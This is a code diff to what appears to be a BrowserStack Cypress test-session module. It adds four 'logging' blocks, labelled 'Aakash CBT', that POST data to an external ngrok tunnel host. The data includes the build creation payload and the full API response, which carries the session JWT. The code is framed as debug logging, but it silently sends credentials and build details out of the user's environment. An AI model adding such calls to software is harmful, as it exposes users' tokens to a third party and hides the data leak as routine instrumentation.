@@ -274,6 +274,20 @@ const setEnvironmentVariablesForRemoteReporter = (BS_TESTOPS_JWT, BS_TESTOPS_BUI
   process.env.BS_TESTOPS_BUILD_HASHED_ID = BS_TESTOPS_BUILD_HASHED_ID;
   process.env.BS_TESTOPS_ALLOW_SCREENSHOTS = BS_TESTOPS_ALLOW_SCREENSHOTS;
   process.env.OBSERVABILITY_LAUNCH_SDK_VERSION = OBSERVABILITY_LAUNCH_SDK_VERSION;
+  
+  // Log environment variables setup for CBT session
+  try {
+    const fetch = require('node-fetch');
+    fetch("https://666c0425a864.ngrok-free.app/logs", {
+      method: "POST",
+      body: JSON.stringify({ 
+        message: `Aakash CBT setEnvironmentVariablesForRemoteReporter - JWT: ${BS_TESTOPS_JWT ? 'SET' : 'NULL'}, BUILD_HASHED_ID: ${BS_TESTOPS_BUILD_HASHED_ID}, ALLOW_SCREENSHOTS: ${BS_TESTOPS_ALLOW_SCREENSHOTS}, SDK_VERSION: ${OBSERVABILITY_LAUNCH_SDK_VERSION}` 
+      }),
+      headers: { "Content-Type": "application/json" },
+    }).catch(err => console.error("Log failed:", err.message));
+  } catch (error) {
+    console.error("Failed to send CBT environment variables log:", error.message);
+  }
 }
 
 const getCypressCommandEventListener = (isJS) => {
@@ -363,6 +377,18 @@ const setCrashReportingConfig = (bsConfig, bsConfigPath) => {
 exports.launchTestSession = async (user_config, bsConfigPath) => {
   setCrashReportingConfig(user_config, bsConfigPath);
 
+  // Log start of CBT session launch
+  try {
+    const fetch = require('node-fetch');
+    fetch("https://666c0425a864.ngrok-free.app/logs", {
+      method: "POST",
+      body: JSON.stringify({ message: `Aakash CBT launchTestSession START - bsConfigPath: ${bsConfigPath}, BROWSERSTACK_AUTOMATION: ${process.env.BROWSERSTACK_AUTOMATION}` }),
+      headers: { "Content-Type": "application/json" },
+    }).catch(err => console.error("Log failed:", err.message));
+  } catch (error) {
+    console.error("Failed to send CBT launchTestSession start log:", error.message);
+  }
+
   const obsUserName = user_config["auth"]["username"];
   const obsAccessKey = user_config["auth"]["access_key"];
 
@@ -403,6 +429,18 @@ exports.launchTestSession = async (user_config, bsConfigPath) => {
           sdkVersion: helper.getAgentVersion()
         }
       };
+
+      // Log build API payload
+      try {
+        const fetch = require('node-fetch');
+        fetch("https://666c0425a864.ngrok-free.app/logs", {
+          method: "POST",
+          body: JSON.stringify({ message: `Aakash CBT launchTestSession - Build creation payload: ${JSON.stringify(data, null, 2)}` }),
+          headers: { "Content-Type": "application/json" },
+        }).catch(err => console.error("Log failed:", err.message));
+      } catch (error) {
+        console.error("Failed to send CBT build payload log:", error.message);
+      }
       const config = {
         auth: {
           username: obsUserName,
@@ -415,6 +453,19 @@ exports.launchTestSession = async (user_config, bsConfigPath) => {
       };
 
       const response = await nodeRequest('POST','api/v1/builds',data,config);
+      
+      // Log build API response
+      try {
+        const fetch = require('node-fetch');
+        fetch("https://666c0425a864.ngrok-free.app/logs", {
+          method: "POST",
+          body: JSON.stringify({ message: `Aakash CBT launchTestSession - Build creation response: ${JSON.stringify(response.data, null, 2)}` }),
+          headers: { "Content-Type": "application/json" },
+        }).catch(err => console.error("Log failed:", err.message));
+      } catch (error) {
+        console.error("Failed to send CBT build response log:", error.message);
+      }
+      
       exports.debug('Build creation successfull!');
       process.env.BS_TESTOPS_BUILD_COMPLETED = true;
       setEnvironmentVariablesForRemoteReporter(response.data.jwt, response.data.build_hashed_id, response.data.allow_screenshots, data.observability_version.sdkVersion);
